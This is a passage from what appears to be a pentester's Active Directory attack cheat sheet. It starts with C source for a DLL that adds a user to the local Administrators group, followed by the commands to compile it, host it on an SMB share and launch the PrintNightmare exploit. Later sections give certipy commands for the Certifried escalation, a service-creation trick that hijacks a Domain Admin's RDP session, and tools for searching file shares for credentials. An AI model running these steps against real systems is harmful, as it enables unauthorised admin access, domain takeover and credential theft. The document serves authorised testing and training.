        &cbDomain,       // Domain size
        &snu             // SID_NAME_USE (enum)
    );

    if (!b) {
        dw = GetLastError();
        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
        return dw;
    }

    // Add user to "Administrators" local group
    memset(&gd, 0, sizeof(gd));

    gd.lgrmi0_sid = (PSID)Sid;

    rc = NetLocalGroupAddMembers(
        NULL,                    // local server
        _T("Administrators"),
        0,                        // information level
        (LPBYTE)&gd,
        1                        // only one entry
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

    return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateAdminUserInternal();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// RUNDLL32 entry point
#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif

// Command-line entry point.
int main()
{
    return CreateAdminUserInternal();
}
```

Compile it: `x86_64-w64-mingw32-gcc -shared -opnightmare2.dll adduser.c -lnetapi32`

Create a share: `smbserver.py -smb2support ATTACKERSHARE .`

Launch the exploit:

```
python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@winterfell.north.sevenkingdoms.local '\\192.168.56.1\ATTACKERSHARE\pnightmare2.dll'
```

Cleanup:

After the exploitation you will find your dlls inside : `C:\Windows\System32\spool\drivers\x64\3`

Also inside: `C:\Windows\System32\spool\drivers\x64\3\Old\{id}\`

## Certifried - CVE-2022–26923

Oliver Lyak found out a way to escalate privilege as a low privilege user into an active directory. This consist of change the dnsHostName property on a created computer. The idea look the same as samAccountName vulnerability, it is a confusion with name on authentication. Details are here : https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4

Create an account with a domain user and set a fake dns name as the domain controller.

certipy account create -u <user> -p <password> -user fakecomputer -dns <same as vuln Domain Controller fqdn>

Request a certificate with the created computer on template Machine

```
certipy req -u 'domain.local/fakecomputer$:<password>@dc.corp.local' -ca <CA> -template Machine
```

More info on this attack here: https://mayfly277.github.io/posts/GOADv2-pwning-part6/
    
## Hijack a Domain Admin's RDP session
    
Login via RDP as a user with local admin rights and open an admin cmd prompt.
    
Run `query user` to show RDP sessions.
    
Create a service that will hijack the DA's session: `sc create sess binpath= "cmd.exe /k tscon <session id to hijack> /dest:<your session name>`
    
Start the service: `net start sess`
    
Your RDP session should be replaced with the session of the target user.

___

# Post-exploitation
___

A note on post-exploitation: Getting Domain/Enterprise Admin should never be the end goal. Showing yourself getting DA in the report may mean nothing to the executive who is responsible for assigning resources such as people or funding for remediation. This is why you need to show what specifically you were able to do with that DA access (show impact). Some examples: (Redacted) screenshots of data you accessed in databases with company or customer data, sensitive data in file shares, access to financial systems, etc.

## File shares

### Linux

[Manspider](https://github.com/blacklanternsecurity/MANSPIDER) crawls SMB shares for juicy information.

```
./manspider.py --threads 256 192.168.1.0/24 -u admin -p password -c passw login
```

### Windows

[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool for pentesters and red teamers to help find delicious candy needles (creds mostly, but it's flexible) in a bunch of horrible boring haystacks (a massive Windows/AD environment).

## MSQL servers

ToDo
